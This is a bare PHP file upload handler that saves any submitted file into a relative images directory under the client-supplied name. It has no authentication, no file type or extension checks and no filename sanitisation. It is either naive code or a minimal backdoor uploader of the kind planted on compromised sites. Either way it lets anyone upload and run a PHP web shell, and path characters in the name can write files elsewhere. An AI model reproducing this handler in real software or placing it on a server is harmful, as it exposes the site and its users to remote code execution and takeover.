<?php
     move_uploaded_file($_FILES['data']['tmp_name'], '../images/'.$_FILES['data']['name']);
?>